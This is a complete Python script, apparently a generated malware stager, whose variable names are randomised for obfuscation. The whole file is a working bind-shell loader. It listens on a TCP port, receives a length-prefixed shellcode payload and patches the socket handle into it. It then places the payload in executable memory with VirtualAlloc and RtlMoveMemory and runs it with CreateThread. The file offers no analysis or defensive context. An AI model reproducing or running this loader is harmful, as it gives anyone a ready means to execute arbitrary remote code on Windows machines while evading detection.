import struct, socket, binascii, ctypes, random, time
hJMKJWQUEL, wedweLAtP = None, None
def AErFtHB():
	try:
		global wedweLAtP
		global HyFhGoiWfWFz
		wedweLAtP = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		wedweLAtP.bind(('112.11.22.44', 3334))
		wedweLAtP.listen(1)
		HyFhGoiWfWFz,_ = wedweLAtP.accept()
		swkSgiYJ = struct.pack('<i', HyFhGoiWfWFz.fileno())
		l = struct.unpack('<i', HyFhGoiWfWFz.recv(4))[0]
		PUSsCZWdRywlhC = b"     "
		while len(PUSsCZWdRywlhC) < l: PUSsCZWdRywlhC += HyFhGoiWfWFz.recv(l)
		qDelnjsQNN = ctypes.create_string_buffer(PUSsCZWdRywlhC, len(PUSsCZWdRywlhC))
		qDelnjsQNN[0] = binascii.unhexlify('BF')
		for i in range(4): qDelnjsQNN[i+1] = swkSgiYJ[i]
		return qDelnjsQNN
	except: return None
def nJRbMFtHPKwsl(gnaUQTYkwWJ):
	if gnaUQTYkwWJ != None:
		tWxwoXL = bytearray(gnaUQTYkwWJ)
		BiGziOxhuWJC = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(tWxwoXL)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
		ctypes.windll.kernel32.VirtualLock(ctypes.c_int(BiGziOxhuWJC), ctypes.c_int(len(tWxwoXL)))
		MmVpus = (ctypes.c_char * len(tWxwoXL)).from_buffer(tWxwoXL)
		ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(BiGziOxhuWJC), MmVpus, ctypes.c_int(len(tWxwoXL)))
		ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(BiGziOxhuWJC),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
		ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
hJMKJWQUEL = AErFtHB()
nJRbMFtHPKwsl(hJMKJWQUEL)